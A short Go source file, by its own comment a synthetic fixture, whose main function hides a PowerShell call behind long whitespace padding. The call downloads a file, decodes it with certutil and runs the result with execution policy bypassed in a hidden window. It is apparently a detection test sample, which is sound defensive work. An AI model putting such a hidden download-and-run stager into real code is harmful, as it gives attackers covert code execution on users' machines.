package main

import (
	"os/exec"
)

// Synthetic fixture: Go source hiding a PowerShell download-decode-run
// stager behind inline whitespace padding. Generic strings only.
func main() {
	exec.Command                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ("powershell", "-WindowStyle", "Hidden", "-Command", "Invoke-WebRequest -Uri 'https://example.com/update' -OutFile 'C:\\Users\\Public\\stage.db'; certutil -decode 'C:\\Users\\Public\\stage.db' 'C:\\Users\\Public\\run.ps1'; Start-Process -FilePath 'powershell' -ArgumentList '-ExecutionPolicy Bypass -File C:\\Users\\Public\\run.ps1' -WindowStyle Hidden -Wait").Run()
}
